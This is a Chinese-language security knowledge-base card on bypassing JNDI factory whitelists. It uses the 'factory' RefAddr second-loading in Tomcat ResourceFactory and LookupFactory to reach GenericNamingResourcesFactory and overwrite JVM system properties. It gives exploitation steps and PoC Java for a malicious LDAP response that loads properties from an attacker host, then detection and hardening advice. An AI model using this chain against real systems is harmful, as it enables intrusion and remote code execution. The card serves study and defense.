---
id: web-java-deserialization-jndi-tomcat-resourcefactory-factory-refaddr-second-injection
title: 只过滤 Reference 的 factory 白名单没用：Tomcat ResourceFactory/LookupFactory 会按 factory 属性再加载任意本地工厂（含 GenericNamingResourcesFactory 覆盖系统属性）
type: scenario
domain: web
path: web/java/deserialization/jndi
technique: jndi-tomcat-factory-refaddr-second-injection
tags:
- java
- jndi
- tomcat
- resourcefactory
- lookupfactory
- objectfactory
- bypass
- system-properties
- rce
cve: []
severity: high
confidence: medium
status: verified
created: '2026-11-08'
updated: '2026-11-08'
verification:
  verified_by: verifier-T2-3W4B
  verified_at: '2026-11-08T21:51:26+08:00'
  notes: 已对照原文核对：FactoryBase 按 Reference 子类型分派（ResourceRef/ResourceEnvRef/EjbRef）、ResourceFactory 的 getLinked 返回 null、按 factoryClassName 实例化并调用 getObjectInstance、ResourceFactory/LookupFactory 读名为 factory 的 StringRefAddr 再加载并调用其 getObjectInstance、GenericNamingResourcesFactory 的 systemProperties 覆盖系统属性、EjbFactory 的 link 二次 lookup 属 DoS 且已按规则排除，均与正文一致。affected_versions 原写 8.5.58/8.5.79 仅为原文对比环境、非受影响区间，已 --clear。本次核对未读取图片，仅依据正文。未验证点：PoC 未在本机执行；覆盖系统属性到 RCE 的衔接原文只写到属性覆盖
url: /docs/web/java/deserialization/jndi/web-java-deserialization-jndi-tomcat-resourcefactory-factory-refaddr-second-injection/
draft: false
kb_aliases:
- Reference factory 二次注入
- factory 白名单绕过
- GenericNamingResourcesFactory 系统属性覆盖
- LookupFactory 二次加载
- FactoryBase getLinked
- Tomcat 本地工厂二次利用
---

## 一句话结论

很多高版本 JNDI 防护只做一件事：检查返回的 `Reference.getFactoryClassName()` 是否落在白名单里。但 Tomcat 的 `FactoryBase` 子类（`ResourceFactory`/`LookupFactory`）在白名单工厂被接受之后，还会读 `Reference` 里名为 `factory` 的 `StringRefAddr`，按它的值**再加载并调用一个新的工厂**；因此只要第一个工厂在白名单内，就能把真正的落地工厂换成任意本地类（如 `org.apache.tomcat.jdbc.naming.GenericNamingResourcesFactory`），用它的 `systemProperties` 属性覆盖 JVM 系统属性。

## 原理

- `FactoryBase.getObjectInstance` 先按 `Reference` 的**子类型**分派：`ResourceRef` → `ResourceFactory`，`ResourceEnvRef` → `ResourceEnvFactory`，`EjbRef` → `EjbFactory`。这层分派只看 Reference 类型，不看工厂类，因此白名单校验通常落在 `getFactoryClassName()` 上。
- `ResourceFactory#getObjectInstance` 逻辑：先 `getLinked(ref)`（`ResourceFactory` 里直接返回 null），否则取 `ref.getFactoryClassName()` 实例化并调用它的 `getObjectInstance`；若该工厂不适用，再走 `getDefaultFactory`。
- 关键在于还有第三段：若 `Reference` 中存在 `factory` 的 `StringRefAddr`，`ResourceFactory` 会把这个 value 当作类名**再加载一次**并调用其 `getObjectInstance`。于是「白名单里的第一个工厂」只是过门的门票，真正的行为由 `factory` 地址决定。
- `org.apache.tomcat.jdbc.naming.GenericNamingResourcesFactory` 是 Tomcat JDBC 提供的通用工厂：它会遍历 `Reference` 的属性，把 `systemProperties` 指向的 `.properties` 文件内容逐条 `System.setProperty`。因为这个工厂在本地 classpath 上、且不是历史上的「恶意工厂」，很容易通过白名单；一旦加载，攻击者就能改写任意 JVM 系统属性。
- 改写系统属性的危害是间接但确定的：可覆盖 `javax.sql.DataSource.Factory`（把 JDBC 工厂指向别的类）、日志/配置加载路径、信任库路径、`com.sun.jndi.*.object.trustURLCodebase` 之类开关，为后续链（JDBC 反序列化、本地工厂劫持）创造条件。
- `LookupFactory` 是同一模式的另一入口：它同样从 Reference 取 `factory` 值，加载、实例化、再调 `getObjectInstance`，形成「本地工厂 → 本地工厂」的二次加载，绕过「只允许某些工厂类」的过滤。
- `EjbFactory` 分支的 `link` 属性会触发一次新的 `lookup`，可造成无限嵌套 lookup（原文指出这属于 DoS），不构成本卡的利用点，列在此仅作排除说明。

## 触发条件

- 存在 JNDI 注入入口，攻击者能返回自定义的 `ResourceRef`/`LookupRef` 序列化数据。
- 受害端有 Tomcat（提供 `org.apache.naming.factory.ResourceFactory`/`LookupFactory` 与 `FactoryBase`）；`systemProperties` 手法还需要 `tomcat-jdbc` 的 `GenericNamingResourcesFactory`。
- 防护只做了「工厂类名白名单」或「过滤 Reference 是否含恶意 factory」，没有禁止 `factory` 这个 `RefAddr` 本身。
- 覆盖系统属性后要能衔接后续链（如再用 JDBC 工厂指向恶意数据源），单靠改属性通常不直接 RCE。

## 利用步骤

1. 探测受害端是否有 Tomcat 本地工厂（可通过报错差异判断 `ResourceFactory` 是否存在）。
2. 构造 `ResourceRef`：`className` 设为一个本地 bean（如带 `setXxx` 的配置类），`factoryClassName` 设为**白名单内的**工厂（过门用），`factoryClassLocation` 留空。
3. 加入关键地址：`StringRefAddr("factory", "org.apache.tomcat.jdbc.naming.GenericNamingResourcesFactory")`，以及 `StringRefAddr("systemProperties", "<可控 .properties 的 URL/路径>")`。
4. LDAP/RMI 返回该 Reference 的序列化数据，诱导 `InitialContext.lookup`。
5. JNDI 先用白名单工厂解析，`ResourceFactory` 再按 `factory` 地址加载 `GenericNamingResourcesFactory`，后者读取 `systemProperties` 并逐条 `System.setProperty`。
6. 观察目标行为变化（如后续 JDBC 连接的工厂类、日志落地路径）确认覆盖生效；若需要 RCE，接 JDBC 反序列化或本地工厂劫持链。

## PoC

恶意 LDAP 服务端构造（示意，未在本机执行）：

```java
ResourceRef ref = new ResourceRef(
        "org.apache.commons.configuration2.SystemConfiguration", // bean class
        null, "", "", true,
        "org.apache.naming.factory.ResourceFactory",            // 白名单工厂（过门）
        null);
// 真正的落地工厂 + 要覆盖的属性文件
ref.add(new StringRefAddr("factory", "org.apache.tomcat.jdbc.naming.GenericNamingResourcesFactory"));
ref.add(new StringRefAddr("systemProperties", "http://attacker/evil.properties"));

Entry entry = new Entry(baseDN);
entry.addAttribute("javaClassName", "java.lang.Class");
entry.addAttribute("javaSerializedData", GadgetUtils.serialize(ref));
result.sendSearchEntry(entry);
```

`LookupFactory` 等价写法（同一 `factory` 二次加载路径）：

```java
LookupRef ref = new LookupRef("org.apache.commons.configuration2.SystemConfiguration",
        "org.apache.naming.factory.LookupFactory", "", "");
ref.add(new StringRefAddr("factory", "org.apache.tomcat.jdbc.naming.GenericNamingResourcesFactory"));
ref.add(new StringRefAddr("systemProperties", "http://attacker/evil.properties"));
```

## 变体与关联

- **变体一**：把 `factory` 换成别的本地「有副作用」工厂类，即可把二次加载变成文件写入、类初始化、连接建立等动作。
- **变体二**：`ResourceFactory` 的 `getDefaultFactory` 分支（`javax.sql.DataSource` → `BasicDataSourceFactory`）是另一条不出网链，属已覆盖场景。
- **变体三**：若防护按「Reference 是否含 factory」做过滤，可改走 `LookupFactory`（过滤规则常只针对 `ResourceFactory`）。
- **关联**：[[web-java-deserialization-jndi-tomcat-resourcefactory-jdbc-bypass]]（同一工厂的 `getDefaultFactory`→JDBC 分支）、[[web-java-deserialization-jndi-tomcat-beanfactory-setter-forcestring-removed]]（同套本地工厂体系下的 BeanFactory 分支）、[[web-java-deserialization-jndi-high-version-c3p0-javabeanobjectfactory]]（另一个本地工厂 sink）。

## 检测与防御

- **防护不能只看工厂类名**：JNDI 侧应禁止 `Reference` 出现 `factory` 这个 `RefAddr`，或对工厂类做「只允许最终落地工厂」的深度校验；直接禁用 `org.apache.naming.factory.*` 被外部 Reference 引用。
- **依赖治理**：移除不必要的 `tomcat-jdbc`/`commons-configuration`；禁止 `System.setProperty` 被 JNDI 解析路径触发。
- **检测**：LDAP/RMI 响应中 `ResourceRef`/`LookupRef` 同时携带 `factory` 与 `systemProperties` 地址是强特征；JVM 内出现「JNDI 线程 → System.setProperty」的调用栈直接告警。
- **加固**：`jdk.serialFilter` 白名单 + 升级 JDK/Tomcat；把 JNDI 入口的 `Reference` 反序列化限制在可信来源。
